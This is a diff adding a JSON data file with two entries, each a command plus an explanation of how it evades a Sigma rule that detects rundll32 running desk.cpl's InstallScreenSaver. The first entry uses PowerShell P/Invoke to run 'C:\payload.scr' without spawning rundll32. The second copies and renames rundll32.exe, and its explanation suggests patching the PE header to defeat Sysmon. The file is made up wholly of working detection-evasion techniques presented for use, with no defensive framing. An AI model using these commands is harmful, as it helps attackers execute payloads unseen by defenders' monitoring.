@@ -1,0 +1,10 @@
+[
+  {
+    "output": "$code = '[DllImport(\"desk.cpl\")] public static extern void InstallScreenSaver(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow);'; $type = Add-Type -MemberDefinition $code -Name 'DeskCPL' -Namespace 'Win32' -PassThru; $type::InstallScreenSaver([IntPtr]::Zero, [IntPtr]::Zero, 'C:\\payload.scr', 0)",
+    "explanation": "The Sigma rule explicitly monitors process creation events for 'rundll32.exe' (via Image or OriginalFileName) and looks for the 'InstallScreenSaver' command line argument. By using PowerShell and P/Invoke to load desk.cpl and execute the InstallScreenSaver export directly in memory, we completely avoid spawning rundll32.exe, bypassing the entire detection logic while achieving the same execution."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\rundll32.exe C:\\Users\\Public\\updater.exe && C:\\Users\\Public\\updater.exe desk.cpl,InstallScreenSaver",
+    "explanation": "This bypass copies and renames rundll32.exe. If the SIEM relies on standard Windows Security Event ID 4688 without deep Sysmon integration (where 'OriginalFileName' from the PE header is not typically captured or parsed), the 'Image|endswith: \\rundll32.exe' condition fails. If Sysmon is active, an attacker would simply need to use a tool to patch the PE resource header of updater.exe to remove 'RUNDLL32.EXE' to fully evade the 'selection_img' condition."
+  }
+]
